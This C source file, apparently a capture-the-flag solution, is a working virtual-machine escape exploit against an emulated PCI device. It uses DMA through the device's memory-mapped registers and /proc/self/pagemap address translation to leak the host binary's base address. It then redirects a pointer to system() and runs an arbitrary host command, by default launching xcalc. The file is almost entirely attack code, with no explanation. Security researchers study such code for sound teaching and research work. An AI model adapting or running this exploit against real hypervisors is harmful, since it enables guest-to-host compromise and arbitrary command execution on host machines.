// gcc exploit.c -DDEBUG -static -o exploit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>

#define IO_READ(addr)		(*(uint64_t*)(memio + (addr)))
#define IO_WRITE(addr, val)	*(uint64_t*)(memio + (addr)) = (val)
#define DMA_SET_SRC(src)	(IO_WRITE(0x80, (src)))
#define DMA_SET_DST(dst)	(IO_WRITE(0x88, (dst)))
#define DMA_SET_CNT(cnt)	(IO_WRITE(0x90, (cnt)))
#define DMA_RUN(cmd)		do{ IO_WRITE(0x98, (cmd)); sleep(1); }while(0);

int mapfd;
void *memio;

static void dma_read(void *dst, uint64_t ofs, unsigned len, char enc);
static void dma_write(uint64_t ofs, void *src, unsigned len);
static uint64_t virt2phys(uint64_t addr);
static void dump(const void *buf, unsigned long size);

int main(int argc, char *argv[]){
	int fd;
	uint64_t addr_hitb_enc;

	if((mapfd = open("/proc/self/pagemap", O_RDONLY)) == -1){
		perror("open");
		exit(-1);
	}

	if((fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR)) == -1){
		perror("open");
		exit(-1);
	}

	if((memio = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED){
		perror("mmap");
		exit(-1);
	}

	dma_read(&addr_hitb_enc, 0x1000, sizeof(addr_hitb_enc), 0);
	uint64_t addr_bin_base = addr_hitb_enc - 0x0283dd0;
	printf("[*] addr_bin_base = 0x%016lx\n", addr_bin_base);
	
	uint64_t addr_plt_system	= addr_bin_base + 0x1fdb18;
	dma_write(0x1000, &addr_plt_system, sizeof(addr_plt_system));

	char *cmd = argc > 1 ? argv[1] : "DISPLAY=:0 xcalc";
	dma_write(0, cmd, strlen(cmd)+1);
	dma_read(NULL, 0, 0, 1);

	close(fd);
	close(mapfd);
}

static void dma_read(void *dst, uint64_t ofs, unsigned len, char enc){
	DMA_SET_SRC(ofs + 0x40000);
	DMA_SET_DST(virt2phys((uint64_t)dst));
	DMA_SET_CNT(len);

	DMA_RUN(enc ? 7 : 3);
}

static void dma_write(uint64_t ofs, void *src, unsigned len){
	DMA_SET_SRC(virt2phys((uint64_t)src));
	DMA_SET_DST(ofs + 0x40000);
	DMA_SET_CNT(len);

	DMA_RUN(1);
}

static uint64_t virt2phys(uint64_t addr){
	uint64_t base;

	lseek(mapfd, sizeof(uint64_t)*(addr >> 12), SEEK_SET);
	if(read(mapfd, &base, sizeof(uint64_t)) < sizeof(uint64_t))
		return 0;
	
	if(!(base & (1L<<63)))
		return 0;

	base <<= 12;
#ifdef DEBUG
	printf("virt : 0x%016lx -> phys : 0x%016lx\n", addr & ~((1<<12)-1), base);
#endif

	return base | (addr & ((1<<12)-1));
}

static void dump(const void *buf, unsigned long size){
	const unsigned long *p = buf;

	size = (size+7) & ~(8-1);
	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(int i = 0; i < size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
